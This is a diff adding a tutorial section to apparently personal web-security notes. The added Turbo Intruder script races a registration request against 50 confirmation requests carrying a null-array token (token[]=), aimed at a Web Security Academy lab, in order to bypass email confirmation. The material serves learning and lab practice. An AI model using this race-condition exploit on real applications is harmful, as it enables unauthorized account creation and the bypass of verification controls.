@@ -74,3 +74,36 @@ In PHP and Ruby we are able to construct requests with null values like this:
 ```
 GET /api/user/info?user=victim&api-key[]= HTTP/2
 ```
+So as example we can try to create user with unexisting email and skip confirmation stage when sending request to /confirm endpoint with null value
+```
+
+def queueRequests(target, wordlists):
+
+    engine = RequestEngine(endpoint=target.endpoint,
+                            concurrentConnections=1,
+                            engine=Engine.BURP2
+                            )
+    
+    confirmationReq = '''POST /confirm?token[]= HTTP/2
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: phpsessionid=YOUR-SESSION-TOKEN
+Content-Length: 0
+
+'''
+    for attempt in range(20):
+        currentAttempt = str(attempt)
+        username = 'User' + currentAttempt
+    
+        # queue a single registration request
+        engine.queue(target.req, username, gate=currentAttempt)
+        
+        # queue 50 confirmation requests - note that this will probably sent in two separate packets
+        for i in range(50):
+            engine.queue(confirmationReq, gate=currentAttempt)
+        
+        # send all the queued requests for this attempt
+        engine.openGate(currentAttempt)
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
